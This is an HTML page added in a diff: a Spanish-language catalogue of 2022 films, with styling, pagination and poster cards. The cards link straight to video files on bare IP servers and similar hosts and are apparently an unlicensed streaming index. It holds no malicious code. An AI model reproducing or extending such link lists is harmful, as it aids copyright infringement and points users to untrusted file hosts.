@@ -1,0 +1,642 @@
+﻿<!DOCTYPE html>
+<html dir='ltr' lang='es' prefix='og: http://ogp.me/ns#' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+<!-- Basic data -->
+<meta charset='UTF-8'/>
+<meta content='article' property='og:type'/>
+<!-- Responsive viewport -->
+<meta content='width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0' name='viewport'/>
+<!-- Title -->
+<title>    </title>
+<style type='text/css'>
+*{margin:0;padding:0;box-sizing:border-box;list-style:grid;}
+a{text-decoration:none;}
+body{background:#000;font-family:Nunito,sans-serif;}
+
+.cards{display:grid;grid-template-columns:repeat(5,1fr);grid;align-items: stretch;
+    justify-items: stretch;}
+
+.card{text-align:center;}
+.card img{
+    padding: 0px;
+    padding-top: 0px;
+    width: 94%;
+    height: 84%;
+    border-radius:7px;}
+
+.card span{padding:0 .3rem;display:none;}
+a{-webkit-tap-highlight-color:rgba(0,0,0,0);-webkit-tap-highlight-color:transparent;} 
+.form__group{position:relative;padding:15px 0 0;margin:0 auto;margin-top:10px;margin-bottom:1rem;width:90%;}
+.form__field{font-family:inherit;width:100%;border:0;border-bottom:2px solid #9b9b9b;outline:0;font-size:1.3rem;color:#fff;padding:7px 0;background:0 0;transition:border-color .2s;}
+.form__field::placeholder{color:transparent;}
+.form__field:placeholder-shown~.form__label{font-size:1.3rem;cursor:text;top:20px;}
+.form__label{position:absolute;top:0;display:block;transition:.2s;font-size:1rem;color:#fff;}
+.form__field:focus{padding-bottom:6px;font-weight:700;border-width:3px;border-image:linear-gradient(to right,red,#008cf7,red);border-image-slice:1;}
+.form__field:focus~.form__label{position:absolute;top:0;display:block;transition:.2s;font-size:1rem;color:red;font-weight:700;}
+.form__field:invalid,.form__field:required{box-shadow:none;}
+
+
+
+/*Fix: Unnecessary elements removed*/
+.widget-item-control,.item-control.blog-admin,
+.continue,.loadmore,.thread-chrome.thread-collapsed,
+.singleton-element:not(.cookie-choices-info),
+.noAllowNewComments .comment-reply,
+.comments .hidden {display:none;}
+/*Fix: Show lightbox*/
+.CSS_LIGHTBOX{z-index:90001!important;}
+/*Fix: Image responsive*/
+a[imageanchor]:not([style*=float]){margin-right:0!important;margin-left:0!important;}
+.widget-content img,
+img[data-original-height],
+img[data-original-width] {height: auto;}
+/*Fix: Comment Editor*/
+#comment-editor{border:0;width:100%;min-height:220px;}
+.box{margin:0 auto;margin-bottom:2rem;width:60%;display:flex;align-items:center;}
+#caps{font-size:1.3rem;}
+.progress{background:#212042;width:100%;height:15px;border-radius:10px;}
+.progress-bar{width:0;opacity:0;height:15px;background:linear-gradient(to right,#228ee9,#1b7dbf);border-radius:10px;display:flex;justify-content:center;align-items:center;transition:1s ease;}
+.box span{padding-left:10px;color:#fff;}
+
+
+
+.xaviec {
+    background: #000;
+    position: fixed;
+    top: -16px;
+    right: -0.5em;
+    width: 20%;
+}
+
+
+
+.card h6{
+background:#212042;
+position:auto;
+margin-bottom:20%;
+color:#fff;
+font-size:0.15.5rem;
+border-radius:7px;
+}
+
+
+/* prueba de paginacion */
+.paginacion {
+	padding-top:10%;
+}
+
+.paginacion ul {
+	list-style:none;
+	text-align: center;
+}
+
+.paginacion ul li {
+	display:inline-block;
+	margin-right:5px;
+}
+
+.paginacion ul li a {
+	display:block;
+	padding:5px 10px;
+	color:#fff;
+	background:#024959;
+	text-decoration: none;
+}
+
+.paginacion ul li a:hover {
+	background:#ff0000;
+}
+
+.paginacion ul li .active {
+    background: #ff0000;
+    box-shadow: 0 0 10px #ff0000, 0 0 60px #ff0000, 0 0 80px #ff0000;
+    transition-delay: 0.1s;
+}
+
+
+/* luz de neon alrededor */
+
+
+img:hover{
+    background: #ff0000;
+    box-shadow: 0 0 10px #ff0000, 0 0 60px #ff0000, 0 0 80px #ff0000; /*efecto con el mouse*/
+}
+
+
+
+
+
+
+        /*          Pagination
+        ***************************/
+        /*Pagination Links Background*/
+
+
+
+.menu-azlist ul.sub-menu a,.AZList>li>a,.wp-pagenavi a,.wp-pagenavi span,.nav-links a,.nav-links span,.tagcloud a{background-color: #313036 }
+        @media screen and (max-width:62em){
+            .Menu>ul>li{border-bottom-color: #313036 }
+            .Menu .sub-menu a{background-color: #313036 }
+        }
+        /*Pagination Links Background Hover*/.menu-azlist ul.sub-menu a:hover,.menu-azlist [class*="current"]>a,.AZList a:hover,.AZList .Current a,.wp-pagenavi a:hover,.wp-pagenavi span.current,.nav-links a:hover,.nav-links [class*="current"],.tagcloud a:hover{background-color: #de1212 }
+        @media screen and (max-width:62em){
+            .Menu .sub-menu a:hover{background-color: #de1212 }
+        }
+        /*Pagination Links Color*/.menu-azlist ul.sub-menu a,.AZList>li>a,.wp-pagenavi a,.wp-pagenavi span,.tagcloud a{color: #fff !important}
+        @media screen and (max-width:62em){
+            .Menu .sub-menu a{color: #fff !important}
+        }
+        /*Pagination Links Color Hover*/.Menu li.menu-azlist:hover ul.sub-menu a:hover,.menu-azlist [class*="current"]>a,.AZList a:hover,.AZList .Current a,.wp-pagenavi a:hover,.wp-pagenavi span.current,.nav-links a:hover,.nav-links [class*="current"],.tagcloud a:hover{color: #fff !important}
+        @media screen and (max-width:62em){
+            .Menu li:hover .sub-menu li:hover a,.Menu .sub-menu li:hover:before{color: #fff !important}
+        }
+
+
+
+
+
+
+
+:root {
+    --body: #110920;
+    --text: #fff;
+    --link: #fff;
+    --link-hover: #03c1ef;
+    --primary: #03c1ef;
+    --secondary: #8c3596;
+    --tertiary: #666;
+    --dark: #000;
+    --light: #fff;
+    --gray: #1b0f30;
+    --gray-light: #311e54;
+    --gray-dark: #eee;
+}
+
+:root {
+    --body: #110920;
+    --text: #fff;
+    --link: #fff;
+    --link-hover: #03c1ef;
+    --primary: #03c1ef;
+    --secondary: #8c3596;
+    --tertiary: #666;
+    --dark: #000;
+    --light: #fff;
+    --gray: #1b0f30;
+    --gray-light: #311e54;
+    --gray-dark: #eee;
+    --dark-2: rgba(0,0,0,.2);
+    --dark-5: rgba(0,0,0,.5);
+    --light-1: rgba(255,255,255,.1);
+    --light-2: rgba(255,255,255,.2);
+    --light-7: rgba(255,255,255,.7);
+    --success: #28a745;
+    --danger: #FF5757;
+    --warning: #ffc107;
+    --size: 1rem;
+    --f-size: 1rem;
+    --family: 'Work Sans';
+}
+
+
+
+
+
+.pagination {
+    text-align: center;
+    font-weight: 700;
+    margin-bottom: var(--size);
+}
+
+a:-webkit-any-link {
+    color: -webkit-link;
+    cursor: pointer;
+    text-decoration: underline;
+}
+
+.btn.snd, .page-link.current, .submit {
+    background-color: var(--primary);
+    color: var(--light);
+    -webkit-box-shadow: 0 0 1rem var(--primary);
+    box-shadow: 0 0 1rem var(--primary);
+}
+
+
+
+.btn, button, [type=button], [type=reset], [type=submit], .pagination a, .extend, .tagcloud a, a.comment-reply-link {
+    cursor: pointer;
+    padding: .5rem 0.1rem;
+    display: inline-block;
+    vertical-align: top;
+    text-align: center;
+    line-height: 2rem;
+    width: auto;
+    background-color: var(--light-2);
+    color: var(--light);
+    min-width: 3rem;
+    border: 0;
+}
+
+
+.page-link.current, .submit {
+    background-color: var(--primary);
+    color: var(--light);
+    -webkit-box-shadow: 0 0 1rem var(--primary);
+    box-shadow: 0 0 1rem var(--primary);
+}
+
+
+
+
+
+
+
+
+
+
+.boton {
+    width: 8em;
+    height: 2em;
+border: 1px solid #2e5c8b;; /*anchura, estilo y color borde*/
+padding: 8px; /*espacio alrededor texto*/
+background-color: #20f504; /*color botón*/
+color: #ffffff; /*color texto*/
+text-decoration: none; /*decoración texto*/
+text-transform: uppercase; /*capitalización texto*/
+font-family: 'Helvetica', sans-serif; /*tipografía texto*/
+border-radius: 50px; /*bordes redondos*/
+    position: absolute;
+    top: 2em;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</style>
+<link href='https://fonts.googleapis.com/css2?family=Nunito&display=swap' rel='stylesheet'/>
+<link href='https://fonts.googleapis.com/css2?family=Lato&display=swap' rel='stylesheet'/>
+<link href='https://fonts.googleapis.com/css2?family=Montserrat&display=swap' rel='stylesheet'/>
+
+  <BR>
+  <BR>
+  <BR>
+
+
+
+<nav class="navigation pagination">
+<div class="nav-links">
+
+				<a class="page-link" href="1.html">1</a>
+				<a class="page-link" href="2.html">2</a>
+				<a class="page-link" href="3.html">3</a>
+				<a class="page-link" href="4.html">4</a>
+				<a class="page-link" href="5.html">5</a>
+				<a class="page-link" href="6.html">6</a>
+				<a class="page-link" href="7.html">7</a>
+				<a class="page-link" href="8.html">8</a>
+				<a class="page-link" href="9.html">9</a>
+				<a class="page-link" href="10.html">10</a>
+		<!--   		<a class="page-link" href="11.html">11</a>
+				<a class="page-link" href="12.html">12</a>
+				<a class="page-link" href="13.html">13</a>
+				<a class="page-link" href="14.html">14</a>
+				<a class="page-link" href="15.html">15</a>
+				<a class="page-link" href="16.html">16</a>
+				<a class="page-link" href="17.html">17</a>
+				<a class="page-link" href="18.html">18</a>
+				<a class="page-link" href="19.html">19</a>
+				<a class="page-link" href="20.html">20</a>
+				<a class="page-link" href="21.html">21</a>
+				<a class="page-link" href="22.html">22</a>
+				<a class="page-link" href="23.html">23</a>
+				<a class="page-link" href="24.html">24</a>
+				<a class="page-link" href="25.html">25</a>
+				<a class="page-link" href="26.html">26</a>
+				<a class="page-link" href="27.html">27</a>
+				<a class="page-link" href="28.html">28</a>          -->
+				<a class="page-link" href="4K.html">4K</a>
+				<a class="page-link" href="2023.html">2023</a>
+				<a class="page-link current" href="2022.html">2022</a>
+				<a class="page-link" href="N1Ñ05.html">INFANTILES</a>
+
+</div>
+</nav>
+
+
+</head>
+<body>
+
+
+
+
+
+
+
+<!--LAS DEMÁS-->
+<div class="xaviec">
+<div class="form__group field">
+<input autocomplete="off" type="input" onkeyup="myFunction()" class="form__field" placeholder="Buscar" name="name" id="myInput" required />
+<label for="name" class="form__label">Buscar</label>
+</div></div></div><br><br><br><br>
+<center><ul class="cards" id="cards">
+
+        
+      <!--      <a class="boton" href="C:\Users\Terminal 2\Desktop\Nueva carpeta (2)\PELIS2022\PELIS2022-PAG2.html" target="_blank">PAG SIG ==>></a>     -->
+
+
+
+
+
+
+
+
+<li> <a href="	http://54.39.52.63/PELICULA/30.5/4129.4.Horsemen.Apocalypse.2022.1080p.WEBRip.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/4/w1280/dt3mo4tArf2llDiht91cnvUtSgT.jpg	"/> <h6>	4 jinetes: Apocalipsis (2022) SUB	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/quattro%20meta%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/1/w1280/4iHOgjnPRUHaobosB9HIiMPSE9W.jpg	"/> <h6>	4 mitades (2022)	</h6></a></li>
+<li> <a href="	https://archive.org/download/9-balas-lat/9%20balas%20lat.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/4/w1280/hNaLkaWYN5eeNwnxHnhGgQPr2aT.jpg	"/> <h6>	9 balas: A la fuga (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/13%20the%20musical%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/8/w1280/170NAAp9SkSk9kTnSioqjR1p2RB.jpg	"/> <h6>	13: El musical (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/30%20noches%20con%20mi%20ex%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/8/w300/nXbhchOec3MKtAcKPO82Qu8r5AW.jpg	"/> <h6>	30 noches con mi ex (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/DICIEMBRE/12dic/42.Segundos.2022.1080p.WEBRip.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/l8dgJQK7QiX6jItMYhAywNCrxIG.jpg	"/> <h6>	42 segundos (2022)	</h6></a></li>
+<li> <a href="	https://archive.org/download/01_20220427_20220427_1537/01.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/4/w1280/k3J2GdYxhR6U2RfsHZOsmHVKW7m.jpg	"/> <h6>	365 días: Aquel día (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/kolejne%20365%20dni%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/8/w1280/dvKpJZUxI1Rsgvrl8HHv62CpBBh.jpg	"/> <h6>	365 días más (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/abandoned%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/6/w1280/9im8JhelZGDbDpXTigJbjMQqy3S.jpg	"/> <h6>	Abandonada (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/hocus%20pocus%202%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/i2uxePzWHeliW3q8ck4W5zfv43w.jpg	"/> <h6>	Abracadabra 2: El retorno de las brujas (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/about%20fate%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/fabZkaVHYJ67KbZx7oFoitauX34.jpg	"/> <h6>	Acerca del destino (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/OCTUBRE/19octubre/19130.Goodbye.Petrushka.2022.1080p.WEBRip.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/6/w1280/8Bhk4bGY9VZ6c0dNuvSbMhnnm3M.jpg	"/> <h6>	Adiós Petrushka (2022) SUB	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/after%20ever%20happy%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/8/w1280/xbMYV7fR9ygl5PGlM6MBZ7Vgjef.jpg	"/> <h6>	After: Amor infinito (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/the%20355%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/1/w1280/kgU2aIuDdPyKtEi8oZ6yzohpfVF.jpg	"/> <h6>	Agentes 355 (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/deep%20water%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/3/w1280/aarAi6bp8Cl3RYXy2lpeLc1hGS7.jpg	"/> <h6>	Aguas profundas (2022)	</h6></a></li>
+<li> <a href="	https://archive.org/download/01_20220523_20220523_1413/01.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/5/w1280/wUvV0gcglEKjTl47olQd9aVLJQj.jpg	"/> <h6>	A la mierda el amor... otra vez (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20AGOSTO/22AGOSTO/13479.Alcarras.2022.1080p.WEBRip.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/4/w1280/uQYR7MNLtLWN1WdbITOqzA28eH9.jpg	"/> <h6>	Alcarrás (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/she%20said%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/11/w1280/770tuDli5fyV3tfjdRnKOVdP6gf.jpg	"/> <h6>	Al descubierto (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/something%20from%20tiffanys%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/11/w1280/ePM4gIQYoyhqprpKlpnWzgXQg4A.jpg	"/> <h6>	Algo de Tiffanys (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/DICIEMBRE/2dic/Alienoid.2022.1080p.BluRay.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/7/w1280/i011PWRJcIVe8d9DscLagjRFuXd.jpg	"/> <h6>	Alienoide (2022) SUB	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULA/3.08/5989.Allegoria.2022.1080p.WEBRip.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/8/w1280/b8QfIeN7J0Qs0cyunDg6GDRiBax.jpg	"/> <h6>	Alegoría (2022) SUB	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/pod%20wiatr%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/2/w1280/snc089VFfKJToYfTjxlvAuLcT4S.jpg	"/> <h6>	Al viento (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/SEPTIEMBRE/28SEP/6819.Amancay.2022.1080p.WEBRip.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/4/w1280/gzULPGjMvFWBoTqpvbaXhdtQ3O6.jpg	"/> <h6>	Amancay (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/ambulance%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/3/w1280/y7Lnz3ayJyW9IWmbA0M19vpBbu4.jpg	"/> <h6>	Ambulancia: Plan de huida (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/blasted%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/6/w1280/jku68zDr7nKVvKvayafyZ49ervT.jpg	"/> <h6>	Amigos vs extraterrestres (2022)	</h6></a></li>
+<li> <a href="	https://archive.org/download/01_20220504_20220504/01.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/4/w1280/mJnldu7WjrGdZnFZMacaoguKX48.jpg	"/> <h6>	Amor de madre (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/love%20in%20the%20villa%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/poQmecI2b4QeEH85oq7Q6ThVnT.jpg	"/> <h6>	Amor en Verona (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/love%20and%20leashes%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/2/w1280/oD1D1jTeZq5bCp22Me3GMndEjvi.jpg	"/> <h6>	Amor com fetiche (2022)	</h6></a></li>
+<li> <a href="	https://archive.org/download/01_20220827_20220827_1709/01.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/8/w1280/eK1TMsGRwMj1f3z5YLdIFhNL5Z0.jpg	"/> <h6>	Amor para adultos (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/redeeming%20love%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/1/w1280/vBpxJkFsfSjghmrizJr5xhQyACQ.jpg	"/> <h6>	Amor redentor (2022)	</h6></a></li>
+<li> <a href="	https://archive.org/download/01_20220701_20220701_1436/01.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/6/w1280/9o4JJYW5AZB714Sa39i5Tj9fILT.jpg	"/> <h6>	Amor y gelato (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/amsterdam%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/chCrPG0LJeilfJwsWPAfmWiJI2T.jpg	"/> <h6>	Amsterdam (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/anikulapo%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/xb30hkUpBm23stnVgDJGYGsC0R0.jpg	"/> <h6>	Anikulapo (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/fantastic%20beasts%20the%20secrets%20of%20dumbledore%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/4/w1280/yOeuJdwag4bAlnvgrdweRoiuXGC.jpg	"/> <h6>	Animales fantásticos: Los secretos de Dumbledore (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/a%20plena%20luz%20el%20caso%20narvarte%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/12/w300/amKjyo7cJwxQrAPNWvGUvj7W30l.jpg	"/> <h6>	A plena luz: El caso Narvarte (2022)	</h6></a></li>
+<li> <a href="	http://74.208.251.230/Contenido/Peliculas/Estrenos/Apolo%2010%c2%bd:%20Una%20infancia%20espacial%20(2022).mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/3/w1280/43EQZnWP9znGqTKfO4BsPALXVYa.jpg	"/> <h6>	Apolo 10½: Una infancia espacial (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/NOVIEMBRE/8nov/18490.Aqua.Teen.Forever.Plantasm.2022.1080p.WEBRip.Dual.Latino.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/10/w1280/dzMfgDxEOfFdw6WIaoC94CayYWL.jpg	"/> <h6>	Aqua Teen por siempre: Plantasma (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/DICIEMBRE/15DIC/1906.Holy.Spider.2022.1080p.BluRay.mkv	 " target="_blank"  class="card"> <img src="	https://es.web.img3.acsta.net/pictures/22/05/17/09/27/4008381.jpg	"/> <h6>	Araña sagrada (2022) SUB	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/ardiente%20paciencia%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/12/w1280/sioiDcvldcz36RlrsXGtAbesqwp.jpg	"/> <h6>	Ardiente paciencia (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/argentina%201985%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/isLWtcB9TK3wLlTzEny2dPH6beh.jpg	"/> <h6>	Argentina 1985 (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20AGOSTO/19agosto/4914.Air.Murder.2022.1080p.WEB-DL.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/4/w1280/sP9ZdhsN7nKhNBFwOfTwKZJ4qAF.jpg	"/> <h6>	Asesinato aéreo (2022) SUB	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/memory%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/4/w1280/bZGWrwOjwR5APPQH61aMnik3oDO.jpg	"/> <h6>	Asesino sin memoria (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/athena%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/uponqptyKtBsJuODqmxoronFd8P.jpg	"/> <h6>	Atenea (2022)	</h6></a></li>
+<li> <a href="	https://archive.org/download/01_20220204_20220204_1825/01.mp4	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/2/w1280/zGnfnPkQRUC1W1R5A8ldI4AfSJu.jpg	"/> <h6>	A través de mi ventana (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/big%20gold%20brick%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/2/w1280/pioc0HaWG2Cf3zoDEGjTgJOSBvv.jpg	"/> <h6>	Atropello salvador: El gran libro de oro (2022)	</h6></a></li>
+<li> <a href="	http://51.81.208.167/pelis2022/Avatar.El.camino.del.agua.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/12/w1280/kUAG4ZQcsNbRyiPyAr3hLdsVgAq.jpg	"/> <h6>	Avatar: El sentido del agua (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/cha%20cha%20real%20smooth%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/6/w1280/n0lzV1LPoDtVERqBurBS0Wzfhmo.jpg	"/> <h6>	Bailando por la vida (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/sotto%20il%20sole%20di%20amalfi%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/7/w1280/oASbLpyFkZ0L3cQkSvEnNjkYurG.jpg	"/> <h6>	Bajo el sol amalfitano (2022)	</h6></a></li>
+<li> <a href="	http://54.39.52.63/PELICULAS%20POR%20MES/SEPTIEMBRE/28SEP/1321.Bandit.2022.1080p.WEBRip.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/5goN1qeWkD2Oq8XA6cw7VgeKXmy.jpg	"/> <h6>	Bandido (2022) SUB	</h6></a></li>
+<li> <a href="	http://74.208.251.230/Contenido/Peliculas/Estrenos/Barba,%20cabello%20y%20bigote%20(2022).mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/7/w1280/4pZdGhTCmpnDYKdoMP3yVUaxefg.jpg	"/> <h6>	Barba cabello y bigote (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/barbarian%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/9/w1280/1YyGqOsEkWjdkBMeUrxhtiLRvlD.jpg	"/> <h6>	Bárbaro (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/barbie%20mermaid%20power%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/10/w1280/aDujpqDAUkpDSeJoCXaFwMyLsmL.jpg	"/> <h6>	Barbie: Poder de sirena (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/bardo%20falsa%20cronica%20de%20unas%20cuantas%20verdades%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/10/w1280/bCU9kfgIfLuxTivXmJ66f93d1tP.jpg	"/> <h6>	Bardo: Falsa crónica de unas cuantas verdades (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/battle%20freestyle%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/4/w1280/7gxWK3zdQbLuGAbtndFdaIaQ7MY.jpg	"/> <h6>	Batalla: Estilo libre (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/batman%20and%20superman%20battle%20of%20the%20super%20sons%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/10/w1280/fQFY3IsdwLl2O5z5YEh97R8A7hY.jpg	"/> <h6>	Batman y Superman: La batalla de los super hijos (2022)	</h6></a></li>
+<li> <a href="	http://vod.tuxchannel.mx/peliculas/720/beauty%202022.mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/6/w1280/yjAXHyMz0JZzYiQP7q1fT5kXLif.jpg	"/> <h6>	Belleza (2022)	</h6></a></li>
+<li> <a href="	http://74.208.251.230/Contenido/Peliculas/Estrenos/Ben%20Crump:%20El%20Abogado%20De%20Los%20Afroamericanos%20(2022).mkv	 " target="_blank"  class="card"> <img src="	https://www.lavanguardia.com/peliculas-series/images/movie/poster/2022/6/w1280/1stPXd2XGAGDZNbWiJXxjycuKae.jpg	"/> <h6>	Ben Crump: El abogado de los afroamericanos (2022)	</h6></a></li>
